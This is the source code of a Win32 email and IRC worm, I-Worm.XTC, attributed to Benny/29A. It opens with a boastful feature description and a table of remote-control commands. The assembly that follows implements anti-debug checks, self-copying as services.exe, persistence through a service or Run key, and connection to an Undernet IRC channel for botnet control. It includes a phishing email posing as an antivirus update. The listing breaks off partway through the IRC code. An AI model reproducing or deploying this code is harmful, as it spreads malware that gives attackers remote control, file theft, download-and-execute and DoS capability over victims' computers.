
COMMENT#

                       	ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                       	³  Project XTC - I-Worm.XTC   ³
                       	ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
	                    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
        	            ³    by Benny/29A    ³
                	    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ



Have you ever thought about internet worm you could have absolute control
above? The worm you could control,plan missions (DOS attax, targets to infect),
which the worm will make? The worm, which will give you access to infected
computer,such like Back Orifice? The worm you could easilly control by IRC and
update by FTP? Very fast spreading worm with stealth, anti-* features and very
small size? Have you ever thought about this? Yeah? You were not alone. I also
like such idea, that's why I coded this worm. It can do exactly the same I
wrote above. For additional informations, read my article "Worms in 21st
century".

This worm was supposed to be my first one. But while I was coding this very
complex worm, I got very bored from that, so meanwhile I coded I-Worm.Energy,
Before I finished it, I got many new ideaz how should my next worm work. I
decided to not implement complex spreading via exploits (that was the main idea
of this worm), finish it ASAP and start to work on the other one.

I finished this one. It was hard work and the result is pretty good looking
worm :-) It is very useful to place this worm to hacked computerz, see below
why. I don't want to write long description, I will just briefly list some of
its main featurez. Have a fun!


1)	Worm is compressed/encrypted/armoured by "tElock" utility. Worm's total
	size is 20kB.
2)	Worm file containz AVX standard icon.
3)	Worm is able to work as a service process under all Win32 platformz.
4)	On Win9x systems worm modifies registry so it will be executed on every
	start of system.
5)	Worm is able to spread via MAPI32 interface. Worm can get e-mail
	addresses from html filez from "Temporary Internet Files" directory
	(there are usually thousandz html filez containing email addresses).
6)	Worm can simulate "fork" (in inactivity it can change to another
	process(change PID), so there will be no constantly running process in
	the system).
7)	Update itself (from FTP) via IRC. See below.
8)	Worm can connect to Undernet IRC server, create/join secret and passworded
	"xtcdan" channel (under random name), stay there and wait for commandz.
	Some superuser can join the channel and administrate infected computer.
	Here is the list of all commandz. If the command is successfully
	performed, worm will reply "**", otherwise ".".
NOTE:	Worm always replies to private window. Commandz written in private
	window will be executed by the addressed worm, commandz written in
	public window will be executed by all wormz.


ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
³             ³                                                               ³
³ Command     ³ Description                                                   ³
³             ³                                                               ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ password    ³ logs on to worm                                               ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ nopassword  ³ logs off from worm                                            ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ dos         ³ starts with DOS attack                                        ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ stopdos     ³ stops the DOS attack                                          ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ spreadon    ³ starts with mail spreading                                    ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ spreadoff   ³ stops the mail spreading                                      ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ spreadto    ³ sends itself to specified e-mail address                      ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ lanspread   ³ starts with LAN spreading                                     ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ reconnect   ³ terminates itself and executes itself again                   ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ exitprocess ³ terminates itself                                             ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ reboot      ³ reboots computer                                              ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ leave       ³ cleans up and delete itself from infected computer            ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ update      ³ downloads file from specified URL and executes it             ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ ircsend     ³ runs the specified IRC command                                ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ mark        ³ payload, sets some default pagez of MSIE to                   ³
³             ³ http://www.therainforestsite.com                              ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ whois       ³ replies if infected computer has the same IP as the specified ³
³             ³ one                                                           ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ machine     ³ retrieves the name of infected computer                       ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ info        ³ retrives some informationz about itself                       ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ sendme      ³ sends specified file to user via DCC                          ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ 1, DCC SEND ³ accepts specified file via DCC                                ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ pwd         ³ retrieves current directory                                   ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ cd          ³ changes current directory                                     ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ md          ³ creates new directory                                         ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ rd          ³ removes specified directory                                   ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ dir         ³ lists all filenamez which match specified mask                ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ del         ³ removes specified file                                        ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ move        ³ moves/renames specified file                                  ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ copy        ³ copies specified file                                         ³
ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
³ exec        ³ executes specified program                                    ³
ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


Everytime after IRC connection is established the worm sends to public window
its version number. Other wormz will check it and if their version number is
bigger, they will send UPDATE command with the URL from which they were lastly
updated.

I think longer description is not needed, the code speaks by itself. If you
have any questionz, feel free to mail me... Have a fun!


ÚÄÄÄÄÄÄÄÄ¿
³ Greetz ³
ÀÄÄÄÄÄÄÄÄÙ

Ratter:		I'm not angry, I just hate if someone stealz my code/ideaz
		without asking. That's all... Try to realise your own ideaz.
Kaspersky:	I really wonder if you will spend more than 1 minute with
		writting description... and I still miss the description for
		Win32.Vulcano!



                                                  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                                                  ³ Benny / 29A ÀÄÄÄÄÄÄÄÄÄÄÄ¿
                                                  @ benny_29a@privacyx.com  ³
                                                  @ http://benny29a.cjb.net ³
                                                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
#


.586p
.model	flat,stdcall				;standard beginning
						;of win32asm code
include	win32api.inc
include	useful.inc

extrn	ExitProcess:PROC			;kernel32.dll APIz
extrn	ExitThread:PROC
extrn	OpenMutexA:PROC
extrn	GetModuleHandleA:PROC
extrn	GetProcAddress:PROC
extrn	GetCommandLineA:PROC
extrn	DeleteFileA:PROC
extrn	GetWindowsDirectoryA:PROC
extrn	GetModuleFileNameA:PROC
extrn	CopyFileA:PROC
extrn	WinExec:PROC
extrn	Sleep:PROC
extrn	GetTickCount:PROC
extrn	GetCurrentDirectoryA:PROC
extrn	SetCurrentDirectoryA:PROC
extrn	CreateDirectoryA:PROC
extrn	RemoveDirectoryA:PROC
extrn	FindFirstFileA:PROC
extrn	FindNextFileA:PROC
extrn	FindClose:PROC
extrn	SetFileAttributesA:PROC
extrn	DeleteFileA:PROC
extrn	MoveFileA:PROC
extrn	CreateFileA:PROC
extrn	CloseHandle:PROC
extrn	WriteFile:PROC
extrn	GetFileSize:PROC
extrn	ReadFile:PROC
extrn	ExitWindowsEx:PROC
extrn	CreateThread:PROC
extrn	CreateProcessA:PROC
extrn	WritePrivateProfileStringA:PROC
extrn	SetErrorMode:PROC
extrn	GetLastError:PROC
extrn	CreateFileMappingA:PROC
extrn	MapViewOfFile:PROC
extrn	UnmapViewOfFile:PROC

extrn	SHGetSpecialFolderPathA:PROC		;SHELL32.dll APIz
extrn	SHSetValueA:PROC
extrn	SHGetValueA:PROC
extrn	SHDeleteValueA:PROC

extrn	InternetOpenA:PROC			;WININET.dll APIz
extrn	InternetConnectA:PROC
extrn	InternetCloseHandle:PROC
extrn	FtpGetFileA:PROC
extrn	FtpSetCurrentDirectoryA:PROC
extrn	InternetCheckConnectionA:PROC

extrn	WSAStartup:PROC				;WSOCK32.dll APIz
extrn	WSACleanup:PROC
extrn	socket:PROC
extrn	gethostbyname:PROC
extrn	connect:PROC
extrn	send:PROC
extrn	recv:PROC
extrn	closesocket:PROC
extrn	gethostname:PROC
extrn	htons:PROC
extrn	htonl:PROC
extrn	bind:PROC
extrn	listen:PROC
extrn	accept:PROC

extrn	OpenServiceA:PROC			;ADVAPI32.dll APIz
extrn	DeleteService:PROC
extrn	OpenSCManagerA:PROC
extrn	CreateServiceA:PROC
extrn	CloseServiceHandle:PROC
extrn	StartServiceCtrlDispatcherA:PROC
extrn	RegisterServiceCtrlHandlerA:PROC
extrn	SetServiceStatus:PROC

extrn	MAPILogon:PROC				;MAPI32.dll APIz
extrn	MAPILogoff:PROC
extrn	MAPISendMail:PROC



STARTUPINFO	STRUCT				;used by CreateProcessA API
	cb		DWORD	?
	lpReserved	DWORD	?
	lpDesktop	DWORD	?
	lpTitle		DWORD	?
	dwX		DWORD	?
	dwY		DWORD	?
	dwXSize		DWORD	?
	dwYSize		DWORD	?
	dwXCountChars	DWORD	?
	dwYCountChars	DWORD	?
	dwFillAttribute	DWORD	?
	dwFlags		DWORD	?
	wShowWindow	WORD	?
	cbReserved2	WORD	?
	lpReserved2	DWORD	?
	hStdInput	DWORD	?
	hStdOutput	DWORD	?
	hStdError	DWORD	?
STARTUPINFO	ENDS

PROCESS_INFORMATION	STRUCT
	hProcess	DWORD	?
	hThread		DWORD	?
	dwProcessId	DWORD	?
	dwThreadId	DWORD	?
PROCESS_INFORMATION	ENDS


WSADATA		struc				;WSADATA structure
mVersion	dw	?			;used by WSOCK32.dll APIz
mHighVersion	dw	?
szDescription	db	257 dup(?)
szSystemStatus	db	129 dup(?)
iMaxSockets	dw	?
iMaxUpdDg	dw	?
lpVendorInfo	dd	?
WSADATA		ends

sock		struc				;socket structure
sin_family	dw	AF_INET			;used by WSOCK32.dll APIz
sin_port	dw	0b1ah
sin_addr	dd	?
sin_zero	db	8 dup (?)
sock		ends
sockSize 	= 	SIZE sock


VERSION1_1	equ	0101h			;equates used by WSOCK32.dll APIz
PCL_NONE	equ	0
SOCK_STREAM	equ	1
AF_INET		equ	2
HOSTENT_IP	equ	10h

PASSWORD	equ	0DDD1275Bh		;CRC32 of the password


@endspc	macro					;macro - skip the space in the
	local	@l				;string
@l:	lodsb
	cmp	al,20h
	jne	@l
endm

@endbr	macro					;macro - skip the CR character
	local	@l				;in the string
@l:	lodsb
	cmp	al,0Dh
	jne	@l
endm


.data
	msg_PASS	db	'password '	;commands that are intercepted
	msg_NOPASS	db	'nopassword'	;by worm on IRC
	msg_DOS		db	'dos '
	msg_SPREADON	db	'spreadon'
	msg_SPREADOFF	db	'spreadoff'
	msg_RECONN	db	'reconnect'
	msg_EXITPROC	db	'exitprocess'
	msg_GETCDIR	db	'pwd'
	msg_SETCDIR	db	'cd '
	msg_DIR		db	'dir'
	msg_MD		db	'md '
	msg_RD		db	'rd '
	msg_DEL		db	'del '
	msg_MOVE	db	'move '
	msg_INFO	db	'info'
	msg_MACHINE	db	'machine'
	msg_DCCRECV	db	1,'DCC SEND '
	msg_SENDME	db	'sendme '
	msg_COPY	db	'copy '
	msg_LEAVE	db	'leave'
	msg_MARK	db	'mark'
	msg_STOPDOS	db	'stopdos'
	msg_IRCSEND	db	'ircsend '
	msg_EXEC	db	'exec '
	msg_WHOIS	db	'whois'
	msg_LAN		db	'lanspread'
	msg_REBOOT	db	'reboot'
	msg_SPREADTO	db	'spreadto '

	irc_server	db	'eu.undernet.org',0	;name of IRC server
	irc_user	db	'USER w w w w',0dh,0ah
	irc_nick	db	'NICK '		;login commandz
	nickname	db	11 dup (?)	;nickname
	irc_join	db	'JOIN #xtcdan heil',0dh,0ah
	irc_mode1	db	'MODE #xtcdan +k heil',0dh,0ah
	irc_mode2	db	'MODE #xtcdan +s',0dh,0ah
						;other login commandz
	info_table	db	'** I-Worm.XTC, written by Benny/29A. Variant '
version_number		db	'0001 '		;signature+version number
	info_size	=	$-info_table

			db	11h
	dec_buff	db	10 dup (?)	;dec->ascii conversion buffer

command_table_stringz:  dd	offset msg_NOPASS	;table of pointerz to
			dd	offset msg_DOS		;commandz
			dd	offset msg_SPREADON
			dd	offset msg_SPREADOFF
			dd	offset msg_RECONN
			dd	offset msg_EXITPROC
			dd	offset msg_GETCDIR
			dd	offset msg_SETCDIR
			dd	offset msg_DIR
			dd	offset msg_MD
			dd	offset msg_RD
			dd	offset msg_DEL
			dd	offset msg_MOVE
			dd	offset msg_INFO
			dd	offset msg_MACHINE
			dd	offset msg_DCCRECV
			dd	offset msg_SENDME
			dd	offset msg_COPY
			dd	offset msg_LEAVE
			dd	offset msg_MARK
			dd	offset msg_STOPDOS
			dd	offset msg_IRCSEND
			dd	offset msg_EXEC
			dd	offset msg_WHOIS
			dd	offset msg_LAN
			dd	offset msg_REBOOT
			dd	offset msg_SPREADTO
num_of_commands = ($-command_table_stringz)/4		;number of commandz

command_table_size:     db	10			;table of size of
			db	4			;each command
			db	8
			db	9
			db	9
			db	11
			db	3
			db	3
			db	3
			db	3
			db	3
			db	4
			db	5
			db	4
			db	7
			db	10
			db	7
			db	5
			db	5
			db	4
			db	7
			db	8
			db	5
			db	5
			db	9
			db	6
			db	9

command_table_jmp:      dd	offset irc_NOPASS	;table of pointerz to
			dd	offset irc_DOS		;command handlerz
			dd	offset irc_SPREADON
			dd	offset irc_SPREADOFF
			dd	offset irc_RECONN
			dd	offset end_worm
			dd	offset irc_GETCDIR
			dd	offset irc_SETCDIR
			dd	offset irc_DIR
			dd	offset irc_MD
			dd	offset irc_RD
			dd	offset irc_DEL
			dd	offset irc_MOVE
			dd	offset irc_INFO
			dd	offset irc_MACHINE
			dd	offset irc_DCCRECV
			dd	offset irc_SENDME
			dd	offset irc_COPY
			dd	offset irc_LEAVE
			dd	offset irc_MARK
			dd	offset irc_STOPDOS
			dd	offset irc_IRCSEND
			dd	offset irc_EXEC
			dd	offset irc_WHOIS
			dd	offset irc_LAN
			dd	offset irc_REBOOT
			dd	offset irc_SPREADTO

	win_table	db	'C:\Windows',0		;standard paths to
			db	'C:\Winnt',0		;windows directory
			db	'C:\Win95',0
			db	'C:\Win98',0
			db	'C:\Win2000',0
			db	'C:\Win2k',0
			db	'C:\WinME',0
	winNumber = 7					;number of paths

	lpMessage	dd	?			;MAPI32 structure
			dd	offset subject
			dd	offset message
			dd	?
			dd	offset date
			dd	?
			dd	2
			dd	offset mailFrom
			dd	1
			dd	offset mailTo
			dd	1
			dd	offset attachment

	subject		db	'AVX update notification',0	;mail subject
	message		db	'Hi,',0dh,0ah,0dh,0ah		;mail message
			db	'We would like to notify you about the newest software '
			db	'designed by SOFTWIN company. This program constantly '
			db	'monitors the net for the newest viral treats and anti-virus '
			db	'databases. In the case some new virus is in-the-wild, it '
			db	'will immediatelly ask you to download the newest version of '
			db	'AntiVirus eXpert 2000 (AVX). It''s small, it''s efficent, it''s '
			db	'secure and powerful. No special licence is needed, it''s freeware. '
			db	'We hope you enjoy AntiVirus eXpert and share it with your friends.'
			db	0dh,0ah,0dh,0ah,0dh,0ah,'Best regards,',0dh,0ah,0dh,0ah
			db	'     AVX developement team.',0
	date		db	'2001/01/01',0		;mail date
	senderAddr	db	'support@avx.com',0	;mail sender

	mailFrom	dd	?			;mail sender structure
			dd	?
			dd	offset mailFrom
			dd	offset senderAddr
			dd	?
			dd	?

	mailTo		dd	?			;mail recipient
			dd	1			;structure
			dd	offset mailTo
			dd	offset mail_address
			dd	?
			dd	?

	attachment	dd	?			;attachment structure
			dd	?
			dd	?
			dd	offset wormname2
			dd	?
			dd	?

	regWorm		db	'%ComSpec% /C del '	;delete command
	wormname2	db	MAX_PATH dup (?)	;worm filename

	IRC_sock	sock	<>			;IRC socket structure
	DCC_sock	sock	<>			;DCC socket structure
	DOS_sock	sock	<>			;DOS socket structure

	hKey		dd	?			;registry key

	wormname	db	MAX_PATH dup (?)	;primary worm filename
	org	wormname
	irc_tmp		db	MAX_PATH dup (?)	;irc buffer
	temppath	db	MAX_PATH dup (?)	;temporary buffer
	mail_address	db	128 dup (?)		;buffer for mail address

	wsadata		WSADATA	<>			;WSADATA structure
	pInfo		PROCESS_INFORMATION	<>	;PROCESS_INFORMATION...
	sInfo		STARTUPINFO	<>		;STARTUPINFO...

	irc_buffer	db	1000h dup (?)		;irc buffer


.code							;worm code starts here
Start:	pushad
	@SEH_SetupFrame <jmp end_worm>			;setup SEH frame

	push	offset up_xtc+5
	push	0
	push	1
	call	OpenMutexA				;check if mutex is
	test	eax,eax					;created, if not,
	je	end_worm				;we are prob. debugged

	push	5000
	call	Sleep					;wait 5 minutez

	push	1
	call	SetErrorMode				;set this win-shit

	push	MAX_PATH
	push	offset wormname2
	push	0
	call	GetModuleFileNameA			;get worm filename
	mov	[wormname2_size],eax			;save the size

	call	SVCRegister				;register as service
e_svc:							;process
	call	HideWorm				;create worm-service
	call	GetCommandLineA				;get ptr to command line
	mov	edi,eax					;to EDI
	xchg	eax,esi
l_gca:	lodsb
	test	al,al
	je	p_copy
	cmp	al,20h
	jne	l_gca					;skip from filename

l_par:	lodsb						;skip from parameterz 
	cmp	al,20h
	je	l_par
	test	al,al
	je	p_copy					;no parameterz

	dec	esi					;yep, parameter present,
	push	esi					;worm already copied,
	call	DeleteFileA				;delete the first copy

@cw:	call	IRCConnect				;connect to IRC

	call	GetTickCount				;get random number
	xor	edx,edx
	mov	ecx,10000
	div	ecx					;normalize to 0..9999

	push	edx
	call	Sleep					;wait random time long

p_copy:	call	CopyWorm				;copy the worm to another
							;file in system directory
end_worm:
	@SEH_RemoveFrame				;remove SEH frame
	popad
	push	0
	call	ExitProcess				;and quit


;this procedure can copy the worm file to system directory of Windows and
;execute it
CopyWorm	Proc
	mov	esi,edi
	mov	edi,offset wormname			;copy the filename to
	@copysz						;buffer

	mov	edi,offset temppath
	push	MAX_PATH
	push	edi
	call	GetWindowsDirectoryA			;get windows directory
	push	edi
	add	edi,eax

	mov	eax,'res\'
	stosd
	mov	eax,'eciv'
	stosd
	mov	eax,'xe.s'
	stosd
	push	'e'
	pop	eax
	stosw						;create windir\services.exe
	pop	edi					;filename

	mov	esi,offset wormname2
	push	0
	push	edi
	push	esi
	call	CopyFileA				;copy worm to sysdir

	push	edi
	push	esi
	mov	esi,edi
	@endsz
	dec	esi
	mov	edi,esi
	pop	esi
	mov	al,20h
	stosb
	@copysz
	pop	edi					;create the command line

	push	0
	push	edi
	call	WinExec					;and execute worm
	ret						;from system directory
CopyWorm	EndP


;this procedure can execute worm as service process
HideWorm	Proc
	push	000F0000h or 2
	push	0
	push	0
	call	OpenSCManagerA				;get handle to SCM
	test	eax,eax
	je	e_scm0
	xchg	eax,esi					;to ESI

	push	10000h
	push	offset up_xtc+5
	push	esi
	call	OpenServiceA
	xchg	eax,ecx
	jecxz	e_scm2

	push	ecx
	push	ecx
	call	DeleteService				;delete service
	call	CloseServiceHandle

e_scm2:	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	offset wormname2
	push	eax
	push	2
	push	10h
	push	000F0000h or 1 or 2 or 4 or 8 or 10h or 20h or 40h or 80h or 100h
	push	offset up_xtc+5
	push	dword ptr [esp]
	push	esi
	call	CreateServiceA				;and create it again
	test	eax,eax
	je	e_scm1

	push	eax
	call	CloseServiceHandle
e_scm1:	push	esi
	call	CloseServiceHandle			;close all opened handlez
	ret

e_scm0:	call	GetLastError				;get error code
	cmp	eax,78h					;if not compatibility
	jne	end_hide				;error then quit

	push	12345678h
wormname2_size = dword ptr $-4
	push	offset wormname2
	push	1
	push	offset up_xtc+5
run_key = $+5
	@pushsz	'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
	push	80000002h				;modify registry so
	call	SHSetValueA				;worm will be executed
							;every start of windows
	@pushsz	'Kernel32.dll'
	call	GetModuleHandleA			;get base address of K32
	xchg	eax,ecx
	jecxz	end_hide
	@pushsz	'RegisterServiceProcess'
	push	ecx
	call	GetProcAddress				;get ptr to API
	xchg	eax,ecx
	jecxz	end_hide
	push	1
	push	0
	call	ecx					;register as service
end_hide:						;process under Win9x
	ret
HideWorm	EndP


;this procedure connects to IRC
IRCConnect	Proc
	push	offset wsadata
	push	VERSION1_1
	call	WSAStartup				;initialize WSOCK32 2.0
	test	eax,eax
	jne	end_hide

	push	offset irc_server
	call	gethostbyname				;get IP of IRC server
	test	eax,eax
	je	end_wsa

	mov	eax,[eax+HOSTENT_IP]
	mov	eax,[eax]
	mov	[IRC_sock.sin_addr],eax

	push	PCL_NONE
	push	SOCK_STREAM
	push	AF_INET
	call	socket					;create socket
	inc	eax
	je	end_wsa
	dec	eax
	mov	[hSocket],eax				;save its handle

	push	sockSize
	push	offset IRC_sock
	push	[hSocket]
	call	connect					;connect to IRC server
	inc	eax
	je	end_irc_socket

new_nick:
	call	GenerateNickName			;generate random nickaname
	sub	edi,offset nickname
	add	edi,5
	mov	ecx,edi
	mov	esi,offset irc_nick
	call	irc_send				;send the nick
	test	ecx,ecx
	je	end_irc_socket

	push	14
	pop	ecx
	mov	esi,offset irc_user
	call	irc_send				;send user infos
	test	ecx,ecx
	je	end_irc_socket

	mov	ecx,1000
	call	irc_recv				;get server reply
	test	eax,eax
	je	end_irc_socket
	inc	eax
	je	end_irc_socket

	mov	ecx,esi
	cmp	[esi],'GNIP'
	jne	s_pong
	mov	byte ptr [esi+1],'O'
	push	esi
l_ping:	lodsb
	cmp	al,0Ah
	jne	l_ping
